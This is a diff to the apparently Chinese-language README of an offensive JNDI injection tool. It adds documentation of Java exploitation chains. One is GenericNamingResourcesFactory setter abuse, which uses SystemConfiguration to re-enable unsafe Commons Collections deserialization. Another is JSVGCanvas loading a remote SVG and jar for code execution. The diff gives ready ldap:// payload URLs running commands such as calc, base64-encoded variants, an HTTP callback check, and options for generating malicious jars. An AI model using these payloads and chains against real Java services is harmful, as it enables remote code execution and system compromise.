@@ -2038,23 +2038,47 @@ ldap://127.0.0.1:1389/SnakeYaml/auto_cmd/Y2FsYw==
 ldap://127.0.0.1:1389/SnakeYaml/class_file/<base64-url-encoded-path-to-evil-class-file>
 ```
 
-### GenericNamingResourcesFactory 本地工厂类修改系统属性
+### GenericNamingResourcesFactory 本地工厂类触发Setter方法
 
-描述：`org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`​的`getObjectInstance`​方法会将目标类进行无参实例化并调用该类的setter方法(setter方法参数为单字符串参数)。参考资料：[Java_JDBC(commonscollection3.2.2)Bypass](https://www.freebuf.com/articles/web/388411.html) [avss geekcon初赛old-log学习](https://xz.aliyun.com/t/14579)
+在tomcat-jdbc.jar包中有个`org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`类，它的`getObjectInstance`方法会将ResourceRef指定的resourceClass目标类进行无参实例化并调用该类的setter方法(setter方法参数为单字符串参数)。所以说如果有某个类的单参数setter方法有危险的利用就可以搭配GenericNamingResourcesFactory进行组合。
 
-setter方法常见的攻击方式有修改系统属性，commons-configuration.jar中的SystemConfiguration.setSystemProperties(String fileName)。groovy.jar中的SystemUtil.setSystemPropertyFrom(String nameValue)。
+参考资料：[Java_JDBC(commonscollection3.2.2)Bypass](https://www.freebuf.com/articles/web/388411.html) [avss geekcon初赛old-log学习](https://xz.aliyun.com/t/14579)
 
-但是修改系统属性还需要注意生效的问题，jndi安全防护机制相关的系统属性由于是在类加载的时候即已设定，所以在程序运行时候将无法修改。但是如果像CC3.2.2的安全防护机制因为是在实时获取系统属性，所以可以修改成功然后打链子：`org.apache.commons.collections.functors.FunctorUtils#checkUnsafeSerialization`​
+#### SystemConfiguration修改系统属性
 
-![image](assets/image-20240602201509-ky6qhz6.png)​
+描述：setter方法常见的攻击方式有修改系统属性，commons-configuration.jar中的SystemConfiguration.setSystemProperties(String fileName)。groovy.jar中的SystemUtil.setSystemPropertyFrom(String nameValue)。
+
+但是修改系统属性还需要注意生效的问题，jndi安全防护机制相关的系统属性由于是在类加载的时候即已设定，所以在程序运行时候将无法修改。但是如果像CC3.2.2的安全防护机制因为是在实时获取系统属性，所以可以修改成功然后打链子：`org.apache.commons.collections.functors.FunctorUtils#checkUnsafeSerialization`![image-20250109222806670](images/image-20250109222806670.png)
 
 限制：依托于`GenericNamingResourcesFactory`​工厂类，有commons-configuration.jar或者groovy.jar能设置系统属性的依赖。只能修改实时获取的系统属性
 
 工具：目前工具集成的是GenericNamingResourcesFactory通过commons-configuration.jar的`SystemConfiguration#setSystemProperties`​方法修改系统属性：
 
 ```python
-ldap://127.0.0.1:1389/SystemConfiguration/org.apache.commons.collections.enableUnsafeSerialization=true
-ldap://127.0.0.1:1389/SystemConfiguration/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmVuYWJsZVVuc2FmZVNlcmlhbGl6YXRpb249dHJ1ZQ==
+ldap://127.0.0.1:1389/Setter/SystemConfiguration/a=1
+ldap://127.0.0.1:1389/Setter/SystemConfiguration/YT0x
+
+ldap://127.0.0.1:1389/Setter/SystemConfiguration/org.apache.commons.collections.enableUnsafeSerialization=true
+ldap://127.0.0.1:1389/Setter/SystemConfiguration/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmVuYWJsZVVuc2FmZVNlcmlhbGl6YXRpb249dHJ1ZQ==
+```
+
+####  JSVGCanvas远程加载svg到远程jar加载
+
+学习参考：[CVE-2022-39197 CS RCE复现分析](http://www.bmth666.cn/2023/03/22/CVE-2022-39197-CS-RCE复现分析/index.html)  [一次曲折的JDK反序列化到JNDI注入绕(no forceString)](https://stack.chaitin.com/techblog/detail/249)  [SVG files and Java code execution](https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html)
+
+描述：org.apache.batik.swing.JSVGCanvas的setURI方法可以远程加载svg文件，然后远程svg文件绑定远程jar包地址即可实现任意代码执行。正好org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory的getObjectInstance可以调用setURI方法实现利用。org.apache.batik.bridge.BaseScriptingEnvironment#loadScript方法中会读取远程jar包中MANIFEST.MF文件SVG-Handler-Class指定的类名进行加载并实例化。所以jar包中只需要写个普通的恶意类就行也不要继承或者实现什么接口：![image-20250112180157614](images/image-20250112180157614.png)
+
+
+
+工具：JSVGCanvas后面直接写漏洞利用效果
+
+```python
+ldap://127.0.0.1:1389/Setter/JSVGCanvas/auto_cmd/calc
+ldap://127.0.0.1:1389/Setter/JSVGCanvas/auto_cmd/Y2FsYw==
+
+# sleep效果经过测试发现不成功,目前不知道原因,所以改为httplog的形式检测
+ldap://127.0.0.1:1389/Setter/JSVGCanvas/httplog/http://127.0.0.1:8000/123
+ldap://127.0.0.1:1389/Setter/JSVGCanvas/httplog/aHR0cDovLzEyNy4wLjAuMTo4MDAwLzEyMw==
 ```
 
 ### MemoryUserDatabaseFactory 本地工程类写文件
@@ -2564,6 +2588,7 @@ rmi://127.0.0.1:1234/Basic
 * jarPayload：ScriptEngineFactory，CommonJar
 
   * ScriptEngineFactory的SPI类型Jar包输出，内部执行Java代码
+  * JSVGJar的JSVGCanvas类型Jar包输出，内部执行Java代码
   * CommonJar一般类型的Jar包输出，内部执行Java代码
 * writeToFile：写入到文件中
 
@@ -2623,8 +2648,16 @@ rmi://127.0.0.1:1234/Basic
 
 工具：使用方式如下：必须带有writeToFile参数，参数值为目录名
 
+生成ScriptEngineFactory类型的jar包
+
 ```python
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -jarPayload "ScriptEngineFactory" -writeToFile "/tmp/"
+```
+
+生成类型的jar包
+
+```python
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -jarPayload "JSVGJar" -writeToFile "/tmp/"
 ```
 
 #### writeToFile 写入到指定目录中
